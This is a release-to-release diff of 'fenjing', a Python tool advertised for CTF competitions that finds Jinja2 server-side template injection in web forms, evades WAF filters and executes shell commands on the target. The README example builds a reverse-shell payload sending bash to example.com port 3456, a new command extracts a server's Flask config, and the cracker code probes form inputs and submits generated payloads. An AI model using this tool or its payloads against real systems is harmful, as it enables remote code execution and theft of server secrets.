# Comparing `tmp/fenjing-0.2.5.tar.gz` & `tmp/fenjing-0.2.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.2.5.tar", last modified: Tue May  9 10:54:05 2023, max compression
+gzip compressed data, was "fenjing-0.2.6.tar", last modified: Mon May 15 04:59:22 2023, max compression
```

## Comparing `fenjing-0.2.5.tar` & `fenjing-0.2.6.tar`

### file list

```diff
@@ -1,25 +1,32 @@
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-09 10:54:05.403000 fenjing-0.2.5/
--rw-r--r--   0 user      (1000) user      (1000)    16725 2023-05-08 08:15:46.000000 fenjing-0.2.5/LICENSE
--rw-r--r--   0 user      (1000) user      (1000)     4552 2023-05-09 10:54:05.402000 fenjing-0.2.5/PKG-INFO
--rwxr-xr-x   0 user      (1000) user      (1000)     4114 2023-05-08 09:40:28.000000 fenjing-0.2.5/README.md
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-09 10:54:05.399000 fenjing-0.2.5/fenjing/
--rwxr-xr-x   0 user      (1000) user      (1000)      159 2023-05-09 09:56:00.000000 fenjing-0.2.5/fenjing/__init__.py
--rw-r--r--   0 user      (1000) user      (1000)       60 2023-03-31 08:38:41.000000 fenjing-0.2.5/fenjing/__main__.py
--rw-r--r--   0 user      (1000) user      (1000)     4792 2023-05-09 10:12:57.000000 fenjing-0.2.5/fenjing/cli.py
--rw-r--r--   0 user      (1000) user      (1000)      799 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/colorize.py
--rwxr-x---   0 user      (1000) user      (1000)       36 2023-03-31 08:02:21.000000 fenjing-0.2.5/fenjing/exceptions.py
--rw-r--r--   0 user      (1000) user      (1000)     2654 2023-05-09 09:45:15.000000 fenjing-0.2.5/fenjing/form.py
--rw-r--r--   0 user      (1000) user      (1000)     6712 2023-05-09 10:12:57.000000 fenjing-0.2.5/fenjing/form_cracker.py
--rwxr-xr-x   0 user      (1000) user      (1000)     2832 2023-04-26 05:00:35.000000 fenjing-0.2.5/fenjing/int_vars.py
--rw-r--r--   0 user      (1000) user      (1000)    27557 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/payload_gen.py
--rw-r--r--   0 user      (1000) user      (1000)     1545 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/requester.py
--rw-r--r--   0 user      (1000) user      (1000)     1156 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/scan_url.py
--rwxr-xr-x   0 user      (1000) user      (1000)     2780 2023-05-08 09:40:28.000000 fenjing-0.2.5/fenjing/shell_payload.py
-drwxr-xr-x   0 user      (1000) user      (1000)        0 2023-05-09 10:54:05.402000 fenjing-0.2.5/fenjing.egg-info/
--rw-r--r--   0 user      (1000) user      (1000)     4552 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 user      (1000) user      (1000)      426 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 user      (1000) user      (1000)        1 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 user      (1000) user      (1000)       30 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/requires.txt
--rw-r--r--   0 user      (1000) user      (1000)        8 2023-05-09 10:54:05.000000 fenjing-0.2.5/fenjing.egg-info/top_level.txt
--rw-r--r--   0 user      (1000) user      (1000)       38 2023-05-09 10:54:05.403000 fenjing-0.2.5/setup.cfg
--rw-r--r--   0 user      (1000) user      (1000)      860 2023-05-08 04:12:10.000000 fenjing-0.2.5/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 04:59:22.290343 fenjing-0.2.6/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-05-15 04:59:04.000000 fenjing-0.2.6/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)       41 2023-05-15 04:59:04.000000 fenjing-0.2.6/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     5101 2023-05-15 04:59:22.290343 fenjing-0.2.6/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     4663 2023-05-15 04:59:04.000000 fenjing-0.2.6/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-15 04:59:04.000000 fenjing-0.2.6/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 04:59:22.286343 fenjing-0.2.6/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      202 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6326 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      800 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      825 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1213 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/const.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)       37 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/exceptions.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2651 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/form.py
+-rw-r--r--   0 runner    (1001) docker     (123)    11548 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/form_cracker.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     3141 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/full_payload_gen.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2846 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/int_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)    26945 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1549 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1156 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)      922 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/shell_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2880 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/waf_func_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 04:59:22.290343 fenjing-0.2.6/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     5101 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      558 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-15 04:59:04.000000 fenjing-0.2.6/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-15 04:59:22.290343 fenjing-0.2.6/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      860 2023-05-15 04:59:04.000000 fenjing-0.2.6/setup.py
```

### Comparing `fenjing-0.2.5/LICENSE` & `fenjing-0.2.6/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.5/PKG-INFO` & `fenjing-0.2.6/README.md`

 * *Files 10% similar despite different names*

```diff
@@ -1,29 +1,16 @@
-Metadata-Version: 2.1
-Name: fenjing
-Version: 0.2.5
-Summary: A Jinja2 SSTI cracker for CTF competitions
-Home-page: https://github.com/Marven11/Fenjing
-Author: Marven11
-Author-email: marven11@example.com
-Classifier: Programming Language :: Python :: 3.9
-Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
-Classifier: Operating System :: OS Independent
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
 ![焚靖](assets/fenjing.webp)
 
 > Bypass the WAF without knowing WAF
 
 焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能
 
 ## 演示
 
-![CTFShow web365](assets/demo.webp)
+![demo](assets/demo.webp)
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
@@ -147,39 +134,49 @@
   -a, --action TEXT    form的action，默认为当前路径
   -m, --method TEXT    form的提交方式，默认为POST
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --user-agent TEXT    请求时使用的User Agent
   --help               Show this message and exit.
+
+Usage: python -m fenjing get-config [OPTIONS]
+
+  攻击指定的表单，并获得目标服务器的flask config
+
+Options:
+  -u, --url TEXT     form所在的URL
+  -a, --action TEXT  form的action，默认为当前路径
+  -m, --method TEXT  form的提交方式，默认为POST
+  -i, --inputs TEXT  form的参数，以逗号分隔
+  --interval FLOAT   每次请求的间隔
+  --user-agent TEXT  请求时使用的User Agent
+  --help             Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
-from fenjing import exec_cmd_payload
-
+from fenjing import exec_cmd_payload, config_payload
 import logging
-
 logging.basicConfig(level = logging.INFO)
 
 def waf(s: str):
     blacklist = [
-        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
+        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
         "[", '"', "'", "_", ".", "+", "~", "{{",
         "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
         "０","１","２","３","４","５","６","７","８","９"
     ]
+    return all(word in s for word in blacklist)
 
-    for word in blacklist:
-        if word in s:
-            return False
-    return True
-
-payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
+if __name__ == "__main__":
+    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
+    config_payload = config_payload(waf)
 
-print(payload)
+    print(f"{shell_payload=}")
+    print(f"{config_payload=}")
 
 ```
```

### Comparing `fenjing-0.2.5/README.md` & `fenjing-0.2.6/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,16 +1,29 @@
+Metadata-Version: 2.1
+Name: fenjing
+Version: 0.2.6
+Summary: A Jinja2 SSTI cracker for CTF competitions
+Home-page: https://github.com/Marven11/Fenjing
+Author: Marven11
+Author-email: marven11@example.com
+Classifier: Programming Language :: Python :: 3.9
+Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
+Classifier: Operating System :: OS Independent
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
 ![焚靖](assets/fenjing.webp)
 
 > Bypass the WAF without knowing WAF
 
 焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能
 
 ## 演示
 
-![CTFShow web365](assets/demo.webp)
+![demo](assets/demo.webp)
 
 ## 快速上手
 
 在以下方法中选择一种
 
 ### 使用pip安装运行
 
@@ -134,39 +147,49 @@
   -a, --action TEXT    form的action，默认为当前路径
   -m, --method TEXT    form的提交方式，默认为POST
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --user-agent TEXT    请求时使用的User Agent
   --help               Show this message and exit.
+
+Usage: python -m fenjing get-config [OPTIONS]
+
+  攻击指定的表单，并获得目标服务器的flask config
+
+Options:
+  -u, --url TEXT     form所在的URL
+  -a, --action TEXT  form的action，默认为当前路径
+  -m, --method TEXT  form的提交方式，默认为POST
+  -i, --inputs TEXT  form的参数，以逗号分隔
+  --interval FLOAT   每次请求的间隔
+  --user-agent TEXT  请求时使用的User Agent
+  --help             Show this message and exit.
 ```
 
 ### 作为python库使用
 
 参考[example.py](example.py)
 
 ```python
-from fenjing import exec_cmd_payload
-
+from fenjing import exec_cmd_payload, config_payload
 import logging
-
 logging.basicConfig(level = logging.INFO)
 
 def waf(s: str):
     blacklist = [
-        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
+        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
         "[", '"', "'", "_", ".", "+", "~", "{{",
         "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
         "０","１","２","３","４","５","６","７","８","９"
     ]
+    return all(word in s for word in blacklist)
 
-    for word in blacklist:
-        if word in s:
-            return False
-    return True
-
-payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
+if __name__ == "__main__":
+    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
+    config_payload = config_payload(waf)
 
-print(payload)
+    print(f"{shell_payload=}")
+    print(f"{config_payload=}")
 
 ```
```

### Comparing `fenjing-0.2.5/fenjing/cli.py` & `fenjing-0.2.6/fenjing/cli.py`

 * *Files 20% similar despite different names*

```diff
@@ -2,16 +2,18 @@
 from urllib.parse import urlparse
 from traceback import print_exc
 from typing import Callable, List
 from functools import partial
 
 from .form import Form
 from .form_cracker import FormCracker
+from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
-from .requester import Requester, DEFAULT_USER_AGENT
+from .requester import Requester
+from .const import DEFAULT_USER_AGENT, OS_POPEN_READ, CONFIG
 from .colorize import colored
 import click
 
 TITLE = colored("yellow", r"""
     ____             _ _            
    / __/__  ____    (_|_)___  ____ _
   / /_/ _ \/ __ \  / / / __ \/ __ `/
@@ -24,16 +26,16 @@
 logging.basicConfig(
     level=logging.INFO,
     format=LOGGING_FORMAT
 )
 logger = logging.getLogger("cli")
 
 
-def cmd_exec(cmd, cracker: FormCracker, field: str, payload_gen: Callable):
-    payload = payload_gen(cmd)
+def cmd_exec(cmd, cracker: FormCracker, field: str, full_payload_gen: FullPayloadGen):
+    payload = full_payload_gen.generate(OS_POPEN_READ, cmd)
     logger.info(f"Submit payload {colored('blue', payload)}")
     r = cracker.submit(
         {field: payload})
     assert r is not None
     return r.text
 
 
@@ -64,14 +66,60 @@
 
 
 @main.command()
 @click.option("--url", "-u", help="form所在的URL")
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
+@click.option("--interval", default=0.0, help="每次请求的间隔")
+@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
+def get_config(
+        url: str,
+        action: str,
+        method: str,
+        inputs: str,
+        interval: float,
+        user_agent: str):
+    """
+    攻击指定的表单，并获得目标服务器的flask config
+    """
+    print(TITLE)
+    assert all(param is not None for param in [
+               url, inputs]), "Please check your param"
+    form = Form(
+        action=action or urlparse(url).path,
+        method=method,
+        inputs=inputs.split(",")
+    )
+    requester = Requester(
+        interval=interval,
+        user_agent=user_agent
+    )
+    cracker = FormCracker(
+        url=url,
+        form=form,
+        requester=requester
+    )
+    result = cracker.crack()
+    if result is None:
+        logger.warning("Test form failed...")
+        return
+    full_payload_gen, field = result
+    payload = full_payload_gen.generate(CONFIG)
+    r = cracker.submit(
+        {field: payload})
+    
+    print(r.text if r is not None else None)
+    logger.warning("Bye!")
+
+@main.command()
+@click.option("--url", "-u", help="form所在的URL")
+@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
+@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
+@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 def crack(
         url: str,
         action: str,
         method: str,
@@ -86,28 +134,30 @@
     assert all(param is not None for param in [
                url, inputs]), "Please check your param"
     form = Form(
         action=action or urlparse(url).path,
         method=method,
         inputs=inputs.split(",")
     )
-    requester = Requester(interval=interval, user_agent=user_agent)
-    cracker = FormCracker(url=url, form=form, requester=requester)
+    requester = Requester(
+        interval=interval,
+        user_agent=user_agent
+    )
+    cracker = FormCracker(
+        url=url,
+        form=form,
+        requester=requester
+    )
     result = cracker.crack()
     if result is None:
         logger.warning("Test form failed...")
         return
-    payload_gen, field = result
+    full_payload_gen, field = result
     cmd_exec_func = partial(cmd_exec, cracker=cracker,
-                            field=field, payload_gen=payload_gen)
-    # def cmd_exec_func(cmd):
-    #     r = cracker.submit(
-    #         {field: payload_gen(cmd)})
-    #     assert r is not None
-    #     return r.text
+                            field=field, full_payload_gen=full_payload_gen)
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
         print(cmd_exec_func(exec_cmd))
     logger.warning("Bye!")
 
 
@@ -124,17 +174,17 @@
     requester = Requester(interval=interval, user_agent=user_agent)
     for page_url, forms in yield_form(requester, url):
         for form in forms:
             cracker = FormCracker(url=page_url, form=form, requester=requester)
             result = cracker.crack()
             if result is None:
                 continue
-            payload_gen, field = result
+            full_payload_gen, field = result
             cmd_exec_func = partial(cmd_exec, cracker=cracker,
-                                    field=field, payload_gen=payload_gen)
+                                    field=field, full_payload_gen=full_payload_gen)
             # def cmd_exec_func(cmd):
             #     r = cracker.submit(
             #         {field: payload_gen(cmd)})
             #     assert r is not None
             #     return r.text
             if exec_cmd == "":
                 interact(cmd_exec_func)
```

### Comparing `fenjing-0.2.5/fenjing/colorize.py` & `fenjing-0.2.6/fenjing/colorize.py`

 * *Ordering differences only*

 * *Files 0% similar despite different names*

```diff
@@ -25,8 +25,8 @@
         "cyan": "36",
     }
     format_str = "\033[{};{}m{}\033[0m"
     if bold:
         format_str = "\033[1;{};{}m{}\033[0m"
     if color not in colors:
         color = "blue"
-    return format_str.format(int(bold), colors[color], text)
+    return format_str.format(int(bold), colors[color], text)
```

### Comparing `fenjing-0.2.5/fenjing/form.py` & `fenjing-0.2.6/fenjing/form.py`

 * *Files 2% similar despite different names*

```diff
@@ -5,14 +5,15 @@
 import string
 from typing import Dict, Any, List
 
 from bs4 import BeautifulSoup
 
 logger = logging.getLogger("utils.form")
 
+
 def Form(*, action: str, inputs: Iterable, method: str = "POST") -> Dict[str, Any]:
     """根据输入生成一个表单
 
     Args:
         action (str): action
         inputs (Iterable): 所有input
         method (str, optional): 提交方法. Defaults to "POST".
@@ -70,15 +71,15 @@
     """
     return {
         k: "".join(random.choices(string.ascii_lowercase, k=8))
         for k in form["inputs"]
     }
 
 
-def fill_form(url, form, form_inputs = None, random_fill_other = True):
+def fill_form(url, form, form_inputs=None, random_fill_other=True):
     """根据输入填充表单，返回给requests库的参数
 
     Args:
         url (str): 表单所在的URL
         form (dict): 表单
         form_inputs (dict, optional): input以及对应的值. Defaults to None.
         random_fill_other (bool, optional): 是否随机填充其他input. Defaults to True.
```

### Comparing `fenjing-0.2.5/fenjing/form_cracker.py` & `fenjing-0.2.6/fenjing/form_cracker.py`

 * *Files 26% similar despite different names*

```diff
@@ -1,21 +1,20 @@
-from urllib.parse import urlparse
-from collections import Counter, namedtuple
-from functools import lru_cache
+from collections import namedtuple
 import logging
-from typing import List, Dict, Tuple, Callable, Any
+from typing import List, Dict, Any
 
-from .form import Form, random_fill, fill_form
+from .form import random_fill, fill_form
 from .requester import Requester
 from .colorize import colored
-from .shell_payload import exec_cmd_payload
-
+from .const import OS_POPEN_READ
+from .waf_func_gen import WafFuncGen
+from .full_payload_gen import FullPayloadGen
 
 logger = logging.getLogger("form_cracker")
-Result = namedtuple("Result", "payload_generate_func input_field")
+Result = namedtuple("Result", "full_payload_gen input_field")
 
 
 class FormCracker:
     """
     对指定的文档进行攻击
     """
     dangerous_keywords = [
@@ -25,50 +24,33 @@
         "0", "1", "2",
     ]
     test_cmd = "echo f3n  j1ng;"
     test_result = "f3n j1ng"
 
     def __init__(
             self,
+            url: str,
             form: Dict[str, Any],
-            method: str = "POST",
-            inputs: List[str] | None = None,
-            url: str | None = None,
-            action: str | None = None,
-            requester: Requester | None = None,
-            request_interval: float = 0.0
+            requester: Requester,
     ):
         """生成用于攻击form的类
 
         Args:
             form (dict): 解析后的form元素
             method (str, optional): form的提交方法. Defaults to "POST".
             inputs (list, optional): form的输入. Defaults to None.
             url (str, optional): form所在的url. Defaults to None.
             action (str, optional): form的action, 为None时和url相同. Defaults to None.
             requester (Requester, optional): 用于发出请求的requester，为None时自动构造. Defaults to None.
             request_interval (float, optional): 请求的间隔，用于构造requester. Defaults to 0.
         """
         self.url = url
-        if form:
-            self.form = form
-        else:
-            assert method is not None and inputs is not None and url is not None, \
-                "[method, inputs, url] should not be None!" # for typing
-            self.form = Form(
-                method=method,
-                inputs=inputs,
-                action=action or urlparse(url).path
-            )
-        if requester:
-            self.req = requester
-        else:
-            self.req = Requester(
-                interval=request_interval
-            )
+        self.form = form
+        self.req = requester
+        self.waf_func_gen = WafFuncGen(self.url, self.form, self.req)
 
     def vulunable_inputs(self) -> List[str]:
         """解析出form中有回显的input
 
         Returns:
             List[str]: 所有有回显的input name
         """
@@ -96,83 +78,52 @@
         all_length = sum(len(v) for v in inputs.values())
         if all_length > 2048 and self.form["method"] == "GET":
             logger.warning(
                 f"inputs are extremely long (len={all_length}) that the request might fail")
         return self.req.request(
             **fill_form(self.url, self.form, inputs))
 
-    def waf_page_hash(self, input_field: str):
-        """使用危险的payload测试对应的input，得到一系列响应后，求出响应中最常见的几个hash
-
-        Args:
-            input_field (str): 需要测试的input
-
-        Returns:
-            List[int]: payload被waf后页面对应的hash
-        """
-        resps = {}
-        for keyword in self.dangerous_keywords:
-            logger.info(
-                f"Testing dangerous keyword {colored('yellow', repr(keyword * 3))}")
-            resps[keyword] = self.submit({input_field: keyword * 3})
-        # resps = {
-        #     keyword: self.submit({input_field: keyword * 3})
-        #     for keyword in self.dangerous_keywords
-        # }
-        hashes = [
-            hash(r.text) for keyword, r in resps.items()
-            if r is not None and r.status_code != 500 and keyword not in r.text
-        ]
-        return [pair[0] for pair in Counter(hashes).most_common(2)]
-
     def crack_inputs(self, input_field: str) -> Result | None:
         """攻击对应的input
 
         Args:
             input_field (str): 需要攻击的input
 
         Returns:
             Result | None: 对应的payload生成函数，以及对应的input
         """
         logger.info(f"Testing {colored('yellow', input_field)}")
 
-        waf_hashes = self.waf_page_hash(input_field)
-
-        @lru_cache(1000)
-        def waf_func(value):
-            r = self.submit({input_field: value})
-            assert r is not None
-            return hash(r.text) not in waf_hashes
-
-        payload, will_echo = exec_cmd_payload(waf_func, self.test_cmd)
+        waf_func = self.waf_func_gen.generate(input_field)
+        full_payload_gen = FullPayloadGen(waf_func)
+        payload, will_echo = full_payload_gen.generate(OS_POPEN_READ, self.test_cmd)
+        # payload, will_echo = exec_cmd_payload(waf_func, self.test_cmd)
         if payload is None:
             return None
         if will_echo:
             logger.info(
                 f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
             r = self.submit({input_field: payload})
             assert r is not None
             if self.test_result in r.text:
                 logger.info(
                     f"{colored('green', 'Success!')} Now we can generate payloads.")
             else:
                 logger.info(
                     f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
             return Result(
-                payload_generate_func=(
-                    lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
+                full_payload_gen=full_payload_gen,
                 input_field=input_field
             )
         else:
             logger.info(
                 f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
                 "You can try generating payloads anyway.")
             return Result(
-                payload_generate_func=(
-                    lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
+                full_payload_gen=full_payload_gen,
                 input_field=input_field
             )
 
     def crack(self) -> Result | None:
         """攻击表单
 
         Returns:
@@ -185,7 +136,183 @@
 
         for input_field in vulunables:
             result = self.crack_inputs(input_field)
             if result:
                 return result
         logger.warning(f"Failed...")
         return None
+
+# class FormCracker:
+#     """
+#     对指定的文档进行攻击
+#     """
+#     dangerous_keywords = [
+#         "config", "self", "os", "class", "mro", "base", "request",
+#         "attr", "open", "system",
+#         "[", '"', "'", "_", ".", "+", "{{", "|",
+#         "0", "1", "2",
+#     ]
+#     test_cmd = "echo f3n  j1ng;"
+#     test_result = "f3n j1ng"
+
+#     def __init__(
+#             self,
+#             form: Dict[str, Any],
+#             method: str = "POST",
+#             inputs: List[str] | None = None,
+#             url: str | None = None,
+#             action: str | None = None,
+#             requester: Requester | None = None,
+#             request_interval: float = 0.0
+#     ):
+#         """生成用于攻击form的类
+
+#         Args:
+#             form (dict): 解析后的form元素
+#             method (str, optional): form的提交方法. Defaults to "POST".
+#             inputs (list, optional): form的输入. Defaults to None.
+#             url (str, optional): form所在的url. Defaults to None.
+#             action (str, optional): form的action, 为None时和url相同. Defaults to None.
+#             requester (Requester, optional): 用于发出请求的requester，为None时自动构造. Defaults to None.
+#             request_interval (float, optional): 请求的间隔，用于构造requester. Defaults to 0.
+#         """
+#         self.url = url
+#         if form:
+#             self.form = form
+#         else:
+#             assert method is not None and inputs is not None and url is not None, \
+#                 "[method, inputs, url] should not be None!"  # for typing
+#             self.form = Form(
+#                 method=method,
+#                 inputs=inputs,
+#                 action=action or urlparse(url).path
+#             )
+#         if requester:
+#             self.req = requester
+#         else:
+#             self.req = Requester(
+#                 interval=request_interval
+#             )
+
+#     def vulunable_inputs(self) -> List[str]:
+#         """解析出form中有回显的input
+
+#         Returns:
+#             List[str]: 所有有回显的input name
+#         """
+#         fill_dict = random_fill(self.form)
+#         r = self.req.request(
+#             **fill_form(
+#                 self.url,
+#                 self.form,
+#                 form_inputs=fill_dict))
+#         assert r is not None
+#         return [
+#             k for k, v in fill_dict.items()
+#             if v in r.text
+#         ]
+
+#     def submit(self, inputs: dict):
+#         """根据inputs提交form
+
+#         Args:
+#             inputs (dict): 需要提交的input
+
+#         Returns:
+#             requests.Response: 返回的reponse元素
+#         """
+#         all_length = sum(len(v) for v in inputs.values())
+#         if all_length > 2048 and self.form["method"] == "GET":
+#             logger.warning(
+#                 f"inputs are extremely long (len={all_length}) that the request might fail")
+#         return self.req.request(
+#             **fill_form(self.url, self.form, inputs))
+
+#     def waf_page_hash(self, input_field: str):
+#         """使用危险的payload测试对应的input，得到一系列响应后，求出响应中最常见的几个hash
+
+#         Args:
+#             input_field (str): 需要测试的input
+
+#         Returns:
+#             List[int]: payload被waf后页面对应的hash
+#         """
+#         resps = {}
+#         for keyword in self.dangerous_keywords:
+#             logger.info(
+#                 f"Testing dangerous keyword {colored('yellow', repr(keyword * 3))}")
+#             resps[keyword] = self.submit({input_field: keyword * 3})
+#         # resps = {
+#         #     keyword: self.submit({input_field: keyword * 3})
+#         #     for keyword in self.dangerous_keywords
+#         # }
+#         hashes = [
+#             hash(r.text) for keyword, r in resps.items()
+#             if r is not None and r.status_code != 500 and keyword not in r.text
+#         ]
+#         return [pair[0] for pair in Counter(hashes).most_common(2)]
+
+#     def crack_inputs(self, input_field: str) -> Result | None:
+#         """攻击对应的input
+
+#         Args:
+#             input_field (str): 需要攻击的input
+
+#         Returns:
+#             Result | None: 对应的payload生成函数，以及对应的input
+#         """
+#         logger.info(f"Testing {colored('yellow', input_field)}")
+
+#         waf_hashes = self.waf_page_hash(input_field)
+
+#         @lru_cache(1000)
+#         def waf_func(value):
+#             r = self.submit({input_field: value})
+#             assert r is not None
+#             return hash(r.text) not in waf_hashes
+
+#         payload, will_echo = exec_cmd_payload(waf_func, self.test_cmd)
+#         if payload is None:
+#             return None
+#         if will_echo:
+#             logger.info(
+#                 f"Input {colored('yellow', repr(input_field))} looks great, testing generated payload.")
+#             r = self.submit({input_field: payload})
+#             assert r is not None
+#             if self.test_result in r.text:
+#                 logger.info(
+#                     f"{colored('green', 'Success!')} Now we can generate payloads.")
+#             else:
+#                 logger.info(
+#                     f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
+#             return Result(
+#                 payload_generate_func=(
+#                     lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
+#                 input_field=input_field
+#             )
+#         else:
+#             logger.info(
+#                 f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
+#                 "You can try generating payloads anyway.")
+#             return Result(
+#                 payload_generate_func=(
+#                     lambda cmd: exec_cmd_payload(waf_func, cmd)[0]),
+#                 input_field=input_field
+#             )
+
+#     def crack(self) -> Result | None:
+#         """攻击表单
+
+#         Returns:
+#             Result | None: 对应的payload生成函数，以及对应的input
+#         """
+#         logger.info(f"Start cracking {self.form}")
+#         vulunables = self.vulunable_inputs()
+#         logger.info(
+#             f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")
+
+#         for input_field in vulunables:
+#             result = self.crack_inputs(input_field)
+#             if result:
+#                 return result
+#         logger.warning(f"Failed...")
+#         return None
```

### Comparing `fenjing-0.2.5/fenjing/int_vars.py` & `fenjing-0.2.6/fenjing/int_vars.py`

 * *Files 5% similar despite different names*

```diff
@@ -1,18 +1,20 @@
 from collections import namedtuple
 
 IntVars = namedtuple("IntVars", "payload ints var_names")
 
+
 def int_var(payload, i, var_name):
     return IntVars(
